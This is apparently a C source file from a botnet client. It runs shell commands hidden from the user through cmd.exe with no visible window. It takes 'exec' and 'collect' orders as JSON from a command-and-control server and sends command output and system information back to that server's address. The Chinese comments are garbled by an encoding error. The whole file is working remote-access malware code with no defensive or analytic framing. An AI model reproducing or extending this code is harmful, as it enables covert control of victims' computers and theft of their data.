#include "bot.h"

// ��ȡ����̲߳����ṹ
typedef struct {
    HANDLE hPipe;
    char* output;
    size_t max_size;
    size_t totalBytes;
} ThreadParams;

// �����ȡ�̺߳���
DWORD WINAPI OutputReaderThread(LPVOID lpParam) {
    ThreadParams* params = (ThreadParams*)lpParam;
    char buffer[4096];
    DWORD bytesRead;

    while (1) {
        if (!ReadFile(params->hPipe, buffer, sizeof(buffer), &bytesRead, NULL) || bytesRead == 0)
            break;
        
        // ȷ���������ռ��㹻
        if (params->totalBytes + bytesRead < params->max_size) {
            memcpy(params->output + params->totalBytes, buffer, bytesRead);
            params->totalBytes += bytesRead;
        } else {
            // ������������ֻ����ʣ��ռ�
            size_t remaining = params->max_size - params->totalBytes - 1;
            if (remaining > 0) {
                memcpy(params->output + params->totalBytes, buffer, remaining);
                params->totalBytes += remaining;
            }
            break;
        }
    }
    
    // ȷ���ַ�����ȷ��ֹ
    if (params->totalBytes < params->max_size) {
        params->output[params->totalBytes] = '\0';
    } else {
        params->output[params->max_size - 1] = '\0';
    }
    
    return 0;
}

char* execute_command(const char *cmd) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hStdoutRd, hStdoutWr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
        #ifdef DEBUG_MODE
        printf("[ERROR] CreatePipe failed: %d\n", GetLastError());
        #endif
        return NULL;
    }
    
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // ȷ�����ش���
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;
    
    char cmdLine[1024];
    strcpy_s(cmdLine, sizeof(cmdLine), "cmd.exe /c ");
    strcat_s(cmdLine, sizeof(cmdLine), cmd);

    // ��������
    if (!CreateProcessA(
            NULL,            // Ӧ�ó�����
            cmdLine,         // ������
            NULL,            // ���̰�ȫ����
            NULL,            // �̰߳�ȫ����
            TRUE,            // ����̳�
            CREATE_NO_WINDOW | DETACHED_PROCESS,
            NULL,            // ��������
            NULL,            // ��ǰĿ¼
            &si,             // STARTUPINFO
            &pi)) {          // PROCESS_INFORMATION
        
        #ifdef DEBUG_MODE
        printf("[ERROR] CreateProcess failed: %d\n", GetLastError());
        #endif
        
        CloseHandle(hStdoutRd);
        CloseHandle(hStdoutWr);
        return NULL;
    }
    
    // �ؼ��޸�1�������رղ���Ҫ�ľ��
    CloseHandle(hStdoutWr);  // ����ܵ�����EOF
    CloseHandle(pi.hThread); // �޸����й©

    // �ؼ��޸�2����̬�����̲߳���
    ThreadParams* params = (ThreadParams*)malloc(sizeof(ThreadParams));
    if (!params) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Memory allocation failed for thread params\n");
        #endif
        CloseHandle(hStdoutRd);
        CloseHandle(pi.hProcess);
        return NULL;
    }

    params->hPipe = hStdoutRd;
    params->output = (char*)malloc(MAX_RESPONSE);
    if (!params->output) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Memory allocation failed for command output\n");
        #endif
        free(params);
        CloseHandle(hStdoutRd);
        CloseHandle(pi.hProcess);
        return NULL;
    }
    params->max_size = MAX_RESPONSE;
    params->totalBytes = 0;
    params->output[0] = '\0';

    // ������ȡ�߳�
    HANDLE hThread = CreateThread(
        NULL, 0, OutputReaderThread, params, 0, NULL
    );
    if (!hThread) {
        #ifdef DEBUG_MODE
        printf("[ERROR] CreateThread failed: %d\n", GetLastError());
        #endif
        free(params->output);
        free(params);
        CloseHandle(hStdoutRd);
        CloseHandle(pi.hProcess);
        return NULL;
    }

    // �ȴ����̽���
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // ��ȡ�˳�����
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess); // �رս��̾��
    
    #ifdef DEBUG_MODE
    printf("[DEBUG] Command exited with code %d\n", exitCode);
    #endif
    
    // �ؼ��޸�3��ȷ���߳���ȫ�˳������޵ȴ���
    WaitForSingleObject(hThread, INFINITE);
    
    // ������Դ
    CloseHandle(hStdoutRd);  // �ܵ���ȡ��
    CloseHandle(hThread);    // �߳̾��

    // ת������������Ȩ
    char* result = params->output;
    free(params); // ֻ�ͷŽṹ�壬���ͷ�output�ڴ�
    
    #ifdef DEBUG_MODE
    printf("[DEBUG] Command output size: %d\n", (int)strlen(result));
    #endif
    
    return result;
}

void parse_and_execute_command(const char *response_body) {
    #ifdef DEBUG_MODE
    printf("[DEBUG] Parsing command: %s\n", response_body);
    #endif

    json_error_t error;
    json_t *root = json_loads(response_body, 0, &error);
    
    if (!root) {
        #ifdef DEBUG_MODE
        printf("[ERROR] JSON parse error: %s\n", error.text);
        #endif
        return;
    }
    
    // ����Ƿ�Ϊ�������
    json_t *type = json_object_get(root, "type");
    if (type && json_is_string(type)) {
        const char *type_str = json_string_value(type);
        if (strcmp(type_str, "result") == 0 || strcmp(type_str, "info") == 0) {
            #ifdef DEBUG_MODE
            printf("[DEBUG] Sending cached result to C2\n");
            #endif
            
            // ���ͽ��״̬
            if (send_data_to_server(C2_IP, C2_PORT, response_body) != 0) {
                #ifdef DEBUG_MODE
                printf("[ERROR] Failed to send result to C2\n");
                #endif
                // ʧ��ʱ���»���
                cache_command(response_body);
            }
            
            json_decref(root);
            return;
        }
    }
    
    // ����action�ֶ�
    json_t *action = json_object_get(root, "action");
    if (action && json_is_string(action)) {
        const char *action_str = json_string_value(action);
        
        if (strcmp(action_str, "exec") == 0) {
            // ִ������
            json_t *command = json_object_get(root, "command");
            if (command && json_is_string(command)) {
                const char *cmd_str = json_string_value(command);
                #ifdef DEBUG_MODE
                printf("[DEBUG] Executing command: %s\n", cmd_str);
                #endif
                
                char *output = execute_command(cmd_str);
                if (output  && *output != '\0' ) {
                    // ��������е������ַ�
                    char *clean_output = clean_command_output(output);
                    
                    // ����������
                    json_t *result_obj = json_object();
                    json_object_set_new(result_obj, "type", json_string("result"));
                    json_object_set_new(result_obj, "bot_id", json_string(bot_id));
                    json_object_set_new(result_obj, "result", json_string(clean_output ? clean_output : output));
                    
                    char *result_str = json_dumps(result_obj, JSON_COMPACT);
                    
                    // ֱ�ӷ��͸�C2
                    if (send_data_to_server(C2_IP, C2_PORT, result_str) != 0) {
                        #ifdef DEBUG_MODE
                        printf("[ERROR] Failed to send command result to C2, caching instead\n");
                        #endif
                        cache_command(result_str);
                    } else {
                        #ifdef DEBUG_MODE
                        printf("[DEBUG] Command result sent to C2\n");
                        #endif
                    }
                    
                    // ������Դ
                    free(result_str);
                    json_decref(result_obj);
                    free(output);
                    if (clean_output) free(clean_output);
                }
            }
        } else if (strcmp(action_str, "collect") == 0) {
            // �ռ�ϵͳ��Ϣ
            char *info = collect_system_info();
            if (info) {
                #ifdef DEBUG_MODE
                printf("[DEBUG] Sending system info\n");
                #endif
                // ����ϵͳ��Ϣ����
                json_t *info_obj = json_object();
                json_object_set_new(info_obj, "type", json_string("info"));
                json_object_set_new(info_obj, "bot_id", json_string(bot_id));
                json_object_set_new(info_obj, "info", json_string(info));
                
                char *info_str = json_dumps(info_obj, JSON_COMPACT);
                
                // ֱ�ӷ��͸�C2
                if (send_data_to_server(C2_IP, C2_PORT, info_str) != 0) {
                    #ifdef DEBUG_MODE
                    printf("[ERROR] Failed to send system info to C2, caching instead\n");
                    #endif
                    cache_command(info_str);
                } else {
                    #ifdef DEBUG_MODE
                    printf("[DEBUG] System info sent to C2\n");
                    #endif
                }
                
                // ������Դ
                free(info_str);
                json_decref(info_obj);
                free(info);
            }
        }
    }
    
    // ����JSON
    json_decref(root);
}


// ����������������������е������ַ�
char* clean_command_output(const char* output) {
    if (!output) return NULL;
    
    size_t len = strlen(output);
    char *clean = malloc(len * 3 + 1); // ��������Ҫ3���ռ�
    if (!clean) return NULL;
    
    char *dst = clean;
    for (const char *src = output; *src; src++) {
        if (*src == '"' || *src == '\\') {
            *dst++ = '\\';
            *dst++ = *src;
        } else if (*src < 32 || *src > 126) {
            // �滻�Ǵ�ӡ�ַ�Ϊ�ո�
            *dst++ = ' ';
        } else {
            *dst++ = *src;
        }
    }
    *dst = '\0';
    
    return clean;
}